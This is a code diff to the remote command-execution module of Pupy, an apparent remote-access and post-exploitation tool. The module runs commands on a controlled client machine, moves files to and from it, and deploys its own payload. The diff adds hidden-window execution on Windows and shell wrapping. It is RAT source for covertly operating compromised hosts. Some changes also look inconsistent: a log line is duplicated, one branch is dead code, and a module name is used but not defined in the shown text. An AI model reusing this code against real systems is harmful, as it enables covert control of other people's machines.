@@ -12,7 +12,6 @@ import re
 import stat
 import pupygen
 import tempfile
-import threading
 
 from rpyc.utils.classic import upload
 
@@ -24,7 +23,7 @@ class PExec(PupyModule):
 
     pipe = None
     completed = False
-    terminate = threading.Event()
+    terminate = False
     updl = re.compile('\^([^\^]+)\^([<>])([^\^]+)\^')
     # daemon = True
 
@@ -70,13 +69,11 @@ class PExec(PupyModule):
         to_download = []
         to_delete = []
 
-        ros = None
+        rsubprocess = self.client.conn.modules['subprocess']
+        ros = self.client.conn.modules['os']
 
         for i, arg in enumerate(cmdargs):
             for local, direction, remote in self.updl.findall(arg):
-                if not ros:
-                    ros = self.client.conn.modules['os']
-
                 if local == '$SELF$':
                     platform = self.client.platform()
                     if not platform in ('windows', 'linux'):
@@ -163,6 +160,26 @@ class PExec(PupyModule):
                     )
                 ]
 
+        if self.client.is_windows():
+            if not args.F:
+                startupinfo = rsubprocess.STARTUPINFO()
+                startupinfo.dwFlags |= rsubprocess.STARTF_USESHOWWINDOW
+                cmdenv.update({
+                    'startupinfo': startupinfo,
+                })
+        else:
+            cmdenv.update({
+                'shell': False
+            })
+            if args.s:
+                cmdargs = [
+                    'cmd.exe', '/c',
+                ] + cmdargs if self.client.is_windows() else [
+                    '/bin/sh', '-c', ' '.join(
+                        '"'+x.replace('"','\"')+'"' for x in cmdargs
+                    )
+                ]
+
         self.pipe = self.client.conn.modules[
             'pupyutils.safepopen'
         ].SafePopen(cmdargs, **cmdenv)
@@ -170,6 +187,10 @@ class PExec(PupyModule):
         if hasattr(self.job, 'id'):
             self.success('Started at {}): '.format(
                 datetime.datetime.now()))
+
+        if hasattr(self.job, 'id'):
+            self.success('Started at (local:{} / remote:{}): '.format(
+                datetime.datetime.now(), rdatetime.datetime.now()))
 
         self.success('Command: {}'.format(' '.join(
             x if not ' ' in x else "'" + x + "'" for x in cmdargs
@@ -222,10 +243,12 @@ class PExec(PupyModule):
             log.close()
 
         if self.pipe.returncode == 0:
-            self.success('Successful at {}: '.format(datetime.datetime.now()))
+            self.success('Successful at (local:{} / remote:{}): '.format(
+                datetime.datetime.now(), rdatetime.datetime.now()))
         else:
-            self.error(
-                'Ret: {} at {}'.format(self.pipe.returncode, datetime.datetime.now()))
+            self.error('Ret: {} at (local:{} / remote:{})'.format(
+                self.pipe.returncode, datetime.datetime.now(), rdatetime.datetime.now(),
+                ))
 
         for remote, local in to_download:
             if ros.path.exists(remote):
